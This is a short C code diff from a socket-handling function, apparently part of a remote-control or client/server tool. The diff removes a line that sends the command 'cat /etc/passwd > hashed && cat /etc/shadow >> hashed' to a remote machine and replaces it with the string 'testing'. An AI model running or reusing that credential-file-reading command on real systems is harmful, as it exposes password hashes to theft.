@@ -79,10 +79,11 @@ void *process_connection(void *socket) {
   //grab a file from the remote machine
   char sendbuf[1024];
   memset(sendbuf, '0', sizeof(sendbuf));
-  snprintf(sendbuf, sizeof(sendbuf), "cat /etc/passwd > hashed && cat /etc/shadow >> hashed");
-  write(socket, sendbuf, strlen(sendbuf));
+  snprintf(sendbuf, sizeof(sendbuf), "testing");
+  write(sock, sendbuf, strlen(sendbuf));
   sleep(1);
   pthread_exit(NULL);
+
 }
 
 //interact with server *not clients*
